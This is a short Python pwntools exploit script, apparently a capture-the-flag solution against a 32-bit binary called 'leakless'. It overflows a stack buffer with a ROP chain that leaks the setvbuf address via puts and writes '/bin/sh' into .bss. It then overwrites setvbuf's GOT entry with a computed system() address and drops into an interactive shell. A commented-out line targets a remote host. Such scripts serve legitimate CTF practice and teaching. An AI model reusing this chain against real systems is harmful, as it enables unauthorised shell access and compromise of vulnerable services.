from pwn import *

p = process("./leakless")
#p = remote("35.243.188.20",2002)
elf = ELF("leakless")

puts_plt = 0x80483f0
read_plt = 0x80483c0
setvbuf_plt = 0x8048420
setvbuf_got = 0x804a024

pppr = 0x8048699
pr = 0x804869b

binsh = "/bin/sh\00"

bss = elf.bss()

log.info("Address of BSS : "+str(hex(bss)))

payload = 'A'*76

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(setvbuf_got)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(len(binsh))

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(setvbuf_got)
payload += p32(4)

payload += p32(setvbuf_plt)
payload += p32(pr)
payload += p32(bss)

p.sendline(payload)
setvbuf_addr = p.recvline()[:4]
log.info("Addres of setvbuf : "+str(hex(u32(setvbuf_addr))))

system_addr = u32(setvbuf_addr) - 175536
log.info("Address of system : "+str(hex(system_addr)))

p.send(binsh)
p.sendline(p32(system_addr))

p.interactive()
